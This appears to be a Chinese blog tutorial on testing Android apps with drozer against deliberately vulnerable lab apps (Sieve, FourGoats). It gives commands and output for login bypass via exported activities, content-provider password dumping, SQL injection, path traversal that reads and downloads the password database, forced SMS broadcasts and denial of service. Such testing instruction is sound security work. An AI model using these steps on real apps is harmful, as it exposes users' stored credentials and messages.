src=\"/images/drozer/image-20200628155856692.png\" alt=\"image-20200628155856692\"></p>\n<h5 id=\"8-4、自动检测\"><a href=\"#8-4、自动检测\" class=\"headerlink\" title=\"8.4、自动检测\"></a>8.4、自动检测</h5><p>以上了解存在SQL注入和目录遍历漏洞，同样drozer提供了自动检测以上漏洞。(建议开始检测此组件前直接扫描是否存在SQL注入、目录遍历)</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//自动检测SQL注入</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run scanner.provider.injection -a com.mwr.example.sieve</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628160315252.png\" alt=\"image-20200628160315252\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//自动检测目录遍历</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run scanner.provider.traversal -a com.mwr.example.sieve</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628160431455.png\" alt=\"image-20200628160431455\"></p>\n<h4 id=\"9、Services\"><a href=\"#9、Services\" class=\"headerlink\" title=\"9、Services\"></a>9、Services</h4><p>一个 Service 是没有界面且能长时间运行于后台的应用组件，其它应用的组件可以启动一个服务运行于后台，即使用户切换到另一个应用也会继续运行；另外，一个组件可以绑定到一 个service来进行交互，即使这个交互是进程间通讯也没问题.例如，一个 service 可能处理网络事物，播放音乐，执行文件 I/O，或与一个内容提供者交互，所有这些都在后台进行。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//检测service</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.service.start --action com.mwr.example.sieve.AuthService</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"10、Broadcast\"><a href=\"#10、Broadcast\" class=\"headerlink\" title=\"10、Broadcast\"></a>10、Broadcast</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//检测Broadcast组件</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.broadcast.info -a org.owasp.goatdroid.fourgoats</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628163232216.png\" alt=\"image-20200628163232216\"></p>\n<p>(APK未加壳直接反编译获取指定参数)</p>\n<p>源代码参数phoneNumber和massage，会发送Your text message has been sent!</p>\n<p><img src=\"/images/drozer/image-20200628190616482.png\" alt=\"image-20200628190616482\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//发送恶意代码</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.broadcast.send --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message 123</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628174809779.png\" alt=\"image-20200628174809779\"></p>\n<p>手机端提示信息发送成功提醒</p>\n<img src=\"/images/drozer/image-20200628174909868.png\" alt=\"image-20200628174909868\" style=\"zoom:50%;\" />\n\n<h4 id=\"11、Vul实战\"><a href=\"#11、Vul实战\" class=\"headerlink\" title=\"11、Vul实战\"></a>11、Vul实战</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//发送恶意数据到手机号上</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.broadcast.send --component com.isi.vul_broadcastreceiver com.isi.vul_broadcastreceiver.MyBroadCastReceiver --extra sting number 18225xxxxx</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"12、拒绝服务\"><a href=\"#12、拒绝服务\" class=\"headerlink\" title=\"12、拒绝服务\"></a>12、拒绝服务</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//拒绝服务分两种空 actoin 和空 extras</span><br><span class=\"line\">//空action</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.broadcast.send --component com.isi.vul_broadcastreceiver com.isi.vul_broadcastreceiver.MyBroadCastReceiver</span></span><br><span class=\"line\">//空extras</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS</span></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/drozer/image-20200628194446420.png\" alt=\"image-20200628194446420\" style=\"zoom:50%;\" />\n\n<h3 id=\"WebView代码执行检测\"><a href=\"#WebView代码执行检测\" class=\"headerlink\" title=\"WebView代码执行检测\"></a>WebView代码执行检测</h3><p>1、检测模版安装</p>\n<p>开启检测前需提前安装模块<code>checkjavascriptbridge</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> module install jubax.javascript</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628200631521.png\" alt=\"image-20200628200631521\"></p>\n<p>2、执行命令检测手机内所有APP</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run scanner.misc.checkjavascriptbridge</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628200729336.png\" alt=\"image-20200628200729336\"></p>\n<p>如果漏洞存在会提醒</p>\n<p><img src=\"/images/drozer/image-20200628200810091.png\" alt=\"image-20200628200810091\"></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>以上总结其实网络上也有很多，只是想总结出来后让自己能明白和了解到关于Android应用组件的检测项及涉及工具。当然Drozer这款综合型检测框架还有很多值得学习，比如写一些模块让检测更加自动化。</p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://showmeshell.top/2018/09/28/How-to-use-drozer/</span><br><span class=\"line\">https://bbs.pediy.com/thread-219107.htm</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>Drozer是MWR Labs开发的一款针对Android系统的综合安全测试框架。Drozer可以通过与Dalivik 虚拟机,以及其它应用程序的IPC端点以及底层操作系统的交互，避免正处于开发阶段，或者部署于你的组织的android应用程序和设备暴露出不可接受的安全风险。</p>\n<h4 id=\"环境配置\"><a href=\"#环境配置\" class=\"headerlink\" title=\"环境配置\"></a>环境配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JDK</span><br><span class=\"line\">python</span><br><span class=\"line\">Android SDK</span><br><span class=\"line\">adb</span><br><span class=\"line\">drozer-agent(安装至Android)</span><br><span class=\"line\">drozer(PC端)</span><br><span class=\"line\">sieve.apk</span><br><span class=\"line\">fourgoats.apk</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"组件及描述\"><a href=\"#组件及描述\" class=\"headerlink\" title=\"组件及描述\"></a>组件及描述</h4><p><img src=\"/images/drozer/image-20200628111010674.png\" alt=\"image-20200628111010674\"></p>\n<center>部分组件概述</center>\n\n<h3 id=\"环境部署\"><a href=\"#环境部署\" class=\"headerlink\" title=\"环境部署\"></a>环境部署</h3><p>drozer部署</p>\n<p><a href=\"https://github.com/mwrlabs/drozer/releases/\">drozer(PC端)下载</a></p>\n<p><a href=\"http://www.si1ent.xyz/Tools/drozer-agent-2.3.4.apk\">drozer(客户端)下载</a></p>\n<p>安装参考网上.</p>\n<h4 id=\"sieve\"><a href=\"#sieve\" class=\"headerlink\" title=\"sieve\"></a>sieve</h4><p><a href=\"http://www.si1ent.xyz/Tools/sieve.apk\">sieve</a></p>\n<p>Sieve是一个小型的Password Manager应用程序，用于展示Android中的一些常见漏洞应用。<br>首次启动Sieve时，它要求用户设置一个16个字符的“主密码”和一个4位数的引脚，用于保护用户稍后输入的密码。 用户可以使用Sieve存储各种服务的密码，如果需要正确的凭据，可以在以后检索。</p>\n<h4 id=\"Vul-Broadcast\"><a href=\"#Vul-Broadcast\" class=\"headerlink\" title=\"Vul_Broadcast\"></a>Vul_Broadcast</h4><p><a href=\"http://www.si1ent.xyz/Tools/Vul_BroadcastReceiver.apk\">Vul_Broadcast</a></p>\n<p>Vul_Broadcast是一款专门用于检测Broadcast组件安全性而设计的APP程序。</p>\n<h4 id=\"fourgoats\"><a href=\"#fourgoats\" class=\"headerlink\" title=\"fourgoats\"></a>fourgoats</h4><p><a href=\"http://www.si1ent/xyz/Tools/goatdroid.apk\">fourgoats</a></p>\n<p>fourgoats是OWASP项目内一款模拟检测Broadcast组件安全性，同时也存在WebView代码执行漏洞等。</p>\n<h3 id=\"检测实战\"><a href=\"#检测实战\" class=\"headerlink\" title=\"检测实战\"></a>检测实战</h3><p>以下检测因部分APP内并不都存在可导出的组件信息，所以结合网络上的APK分别测试不同组件产生的危害。</p>\n<h4 id=\"0、连接\"><a href=\"#0、连接\" class=\"headerlink\" title=\"0、连接\"></a>0、连接</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">手机提前开启调试模式</span><br><span class=\"line\">adb forward tcp:31415 tcp:31415</span><br><span class=\"line\">31415</span><br><span class=\"line\">//查看连接(如下表示连接正常)</span><br><span class=\"line\">adb devices</span><br><span class=\"line\">List of devices attached</span><br><span class=\"line\">9SQ4Y9FU99999999\tdevice</span><br><span class=\"line\">//drozer连接</span><br><span class=\"line\">drozer console connect</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628144434578.png\" alt=\"image-20200628144434578\"></p>\n<h4 id=\"1、包名检测\"><a href=\"#1、包名检测\" class=\"headerlink\" title=\"1、包名检测\"></a>1、包名检测</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.package.list</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628144457885.png\" alt=\"image-20200628144457885\"></p>\n<center>部分APP</center>\n\n\n<h4 id=\"2、sieve实例\"><a href=\"#2、sieve实例\" class=\"headerlink\" title=\"2、sieve实例\"></a>2、sieve实例</h4><p>因Android内包名是唯一标识，所以可根据名称进行检索</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.package.list -f sieve</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628144824371.png\" alt=\"image-20200628144824371\"></p>\n<h4 id=\"3、APP信息\"><a href=\"#3、APP信息\" class=\"headerlink\" title=\"3、APP信息\"></a>3、APP信息</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.package.info -a com.mwr.example.sieve</span></span><br><span class=\"line\">Package: com.mwr.example.sieve</span><br><span class=\"line\">  Application Label: Sieve</span><br><span class=\"line\">  Process Name: com.mwr.example.sieve</span><br><span class=\"line\">  Version: 1.0</span><br><span class=\"line\">  Data Directory: /data/data/com.mwr.example.sieve</span><br><span class=\"line\">  APK Path: /data/app/com.mwr.example.sieve-1/base.apk</span><br><span class=\"line\">  UID: 10104</span><br><span class=\"line\">  GID: [1028, 1015, 3003]</span><br><span class=\"line\">  Shared Libraries: null</span><br><span class=\"line\">  Shared User ID: null</span><br><span class=\"line\">  Uses Permissions:</span><br><span class=\"line\">  - android.permission.READ_EXTERNAL_STORAGE</span><br><span class=\"line\">  - android.permission.WRITE_EXTERNAL_STORAGE</span><br><span class=\"line\">  - android.permission.INTERNET</span><br><span class=\"line\">  Defines Permissions:</span><br><span class=\"line\">  - com.mwr.example.sieve.READ_KEYS</span><br><span class=\"line\">  - com.mwr.example.sieve.WRITE_KEYS</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628144936720.png\" alt=\"image-20200628144936720\"></p>\n<h4 id=\"4、漏洞检测\"><a href=\"#4、漏洞检测\" class=\"headerlink\" title=\"4、漏洞检测\"></a>4、漏洞检测</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.package.attacksurface com.mwr.example.sieve</span></span><br><span class=\"line\">Attack Surface:</span><br><span class=\"line\">  3 activities exported</span><br><span class=\"line\">  0 broadcast receivers exported</span><br><span class=\"line\">  2 content providers exported</span><br><span class=\"line\">  2 services exported</span><br><span class=\"line\">    is debuggable</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628145213646.png\" alt=\"image-20200628145213646\"></p>\n<h4 id=\"5、Activities\"><a href=\"#5、Activities\" class=\"headerlink\" title=\"5、Activities\"></a>5、Activities</h4><p>Activities组件是Android新建APP每个功能均会存在的Activities页面；同样如果未对某些页面作限制可能导致绕过登录入口而进入某功能。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.activity.info -a com.mwr.example.sieve</span></span><br><span class=\"line\">Package: com.mwr.example.sieve</span><br><span class=\"line\">  com.mwr.example.sieve.FileSelectActivity</span><br><span class=\"line\">    Permission: null</span><br><span class=\"line\">  com.mwr.example.sieve.MainLoginActivity</span><br><span class=\"line\">    Permission: null</span><br><span class=\"line\">  com.mwr.example.sieve.PWList\t//可倒出，未设置权限认证</span><br><span class=\"line\">    Permission: null</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628145406392.png\" alt=\"image-20200628145406392\"></p>\n<h4 id=\"6、Activities攻击\"><a href=\"#6、Activities攻击\" class=\"headerlink\" title=\"6、Activities攻击\"></a>6、Activities攻击</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//会直接绕过登录,进入密码添加.</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628145915024.png\" alt=\"image-20200628145915024\"></p>\n<h4 id=\"7、ContentProvider\"><a href=\"#7、ContentProvider\" class=\"headerlink\" title=\"7、ContentProvider\"></a>7、ContentProvider</h4><p>Android平台提供了Content Provider使一个应用程序的指定数据集提供给其他应用程序。这些数据可以存储在文件系统中、在一个SQLite数据库、或以任何其他合理的方式。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。只有需要在多个应用程序间共享数据是才需要内容提供者。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run scanner.provider.finduris -a com.mwr.example.sieve</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628151122062.png\" alt=\"image-20200628151122062\"></p>\n<center>Able to Query可查询数据</center>\n\n<h4 id=\"8、ContentProvider攻击\"><a href=\"#8、ContentProvider攻击\" class=\"headerlink\" title=\"8、ContentProvider攻击\"></a>8、ContentProvider攻击</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/</span></span><br><span class=\"line\">或</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628152212737.png\" alt=\"image-20200628152212737\"></p>\n<center>如上数据泄露</center>\n\n<h5 id=\"8-1、SQL注入\"><a href=\"#8-1、SQL注入\" class=\"headerlink\" title=\"8.1、SQL注入\"></a>8.1、SQL注入</h5><p>Android使用SQLite来存储数据，也可能造成SQL注入漏洞。</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ -<span class=\"literal\">-projection</span> <span class=\"string\">&quot;&#x27;&quot;</span>\t\t\t//提交单引号测试(如下报错)</span><br><span class=\"line\">unrecognized token: <span class=\"string\">&quot;&#x27; FROM Passwords&quot;</span> (code <span class=\"number\">1</span>): , <span class=\"keyword\">while</span> compiling: <span class=\"built_in\">SELECT</span> <span class=\"string\">&#x27; FROM Passwords</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628152803161.png\" alt=\"image-20200628152803161\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection <span class=\"string\">&quot;&#x27;&quot;</span></span></span><br><span class=\"line\">unrecognized token: &quot;&#x27;)&quot; (code 1): , while compiling: SELECT * FROM Passwords WHERE (&#x27;)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">列出数据库中所有表及相关结构信息</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection <span class=\"string\">&quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;–&quot;</span></span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628153216874.png\" alt=\"image-20200628153216874\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查询其他表</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection <span class=\"string\">&quot;* FROM Key;–&quot;</span></span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628153439019.png\" alt=\"image-20200628153439019\"></p>\n<h5 id=\"8-2、目录遍历\"><a href=\"#8-2、目录遍历\" class=\"headerlink\" title=\"8.2、目录遍历\"></a>8.2、目录遍历</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//检测存在目录遍历</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run scanner.provider.traversal -a com.mwr.example.sieve</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628154719291.png\" alt=\"image-20200628154719291\"></p>\n<h5 id=\"8-3、读取敏感信息\"><a href=\"#8-3、读取敏感信息\" class=\"headerlink\" title=\"8.3、读取敏感信息\"></a>8.3、读取敏感信息</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//读取手机内信息</span><br><span class=\"line\">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628155031780.png\" alt=\"image-20200628155031780\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//下载文件到本地</span><br><span class=\"line\">run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db ./database.db</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628155519778.png\" alt=\"image-20200628155519778\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">下载是sqlite文件并保存有主密码</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628155856692.png\" alt=\"image-20200628155856692\"></p>\n<h5 id=\"8-4、自动检测\"><a href=\"#8-4、自动检测\" class=\"headerlink\" title=\"8.4、自动检测\"></a>8.4、自动检测</h5><p>以上了解存在SQL注入和目录遍历漏洞，同样drozer提供了自动检测以上漏洞。(建议开始检测此组件前直接扫描是否存在SQL注入、目录遍历)</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//自动检测SQL注入</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run scanner.provider.injection -a com.mwr.example.sieve</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628160315252.png\" alt=\"image-20200628160315252\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//自动检测目录遍历</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run scanner.provider.traversal -a com.mwr.example.sieve</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628160431455.png\" alt=\"image-20200628160431455\"></p>\n<h4 id=\"9、Services\"><a href=\"#9、Services\" class=\"headerlink\" title=\"9、Services\"></a>9、Services</h4><p>一个 Service 是没有界面且能长时间运行于后台的应用组件，其它应用的组件可以启动一个服务运行于后台，即使用户切换到另一个应用也会继续运行；另外，一个组件可以绑定到一 个service来进行交互，即使这个交互是进程间通讯也没问题.例如，一个 service 可能处理网络事物，播放音乐，执行文件 I/O，或与一个内容提供者交互，所有这些都在后台进行。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//检测service</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.service.start --action com.mwr.example.sieve.AuthService</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"10、Broadcast\"><a href=\"#10、Broadcast\" class=\"headerlink\" title=\"10、Broadcast\"></a>10、Broadcast</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//检测Broadcast组件</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.broadcast.info -a org.owasp.goatdroid.fourgoats</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628163232216.png\" alt=\"image-20200628163232216\"></p>\n<p>(APK未加壳直接反编译获取指定参数)</p>\n<p>源代码参数phoneNumber和massage，会发送Your text message has been sent!</p>\n<p><img src=\"/images/drozer/image-20200628190616482.png\" alt=\"image-20200628190616482\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//发送恶意代码</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.broadcast.send --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message 123</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628174809779.png\" alt=\"image-20200628174809779\"></p>\n<p>手机端提示信息发送成功提醒</p>\n<img src=\"/images/drozer/image-20200628174909868.png\" alt=\"image-20200628174909868\" style=\"zoom:50%;\" />\n\n<h4 id=\"11、Vul实战\"><a href=\"#11、Vul实战\" class=\"headerlink\" title=\"11、Vul实战\"></a>11、Vul实战</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//发送恶意数据到手机号上</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.broadcast.send --component com.isi.vul_broadcastreceiver com.isi.vul_broadcastreceiver.MyBroadCastReceiver --extra sting number 18225xxxxx</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"12、拒绝服务\"><a href=\"#12、拒绝服务\" class=\"headerlink\" title=\"12、拒绝服务\"></a>12、拒绝服务</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//拒绝服务分两种空 actoin 和空 extras</span><br><span class=\"line\">//空action</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.broadcast.send --component com.isi.vul_broadcastreceiver com.isi.vul_broadcastreceiver.MyBroadCastReceiver</span></span><br><span class=\"line\">//空extras</span><br><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS</span></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/drozer/image-20200628194446420.png\" alt=\"image-20200628194446420\" style=\"zoom:50%;\" />\n\n<h3 id=\"WebView代码执行检测\"><a href=\"#WebView代码执行检测\" class=\"headerlink\" title=\"WebView代码执行检测\"></a>WebView代码执行检测</h3><p>1、检测模版安装</p>\n<p>开启检测前需提前安装模块<code>checkjavascriptbridge</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> module install jubax.javascript</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628200631521.png\" alt=\"image-20200628200631521\"></p>\n<p>2、执行命令检测手机内所有APP</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">dz&gt;</span><span class=\"bash\"> run scanner.misc.checkjavascriptbridge</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/drozer/image-20200628200729336.png\" 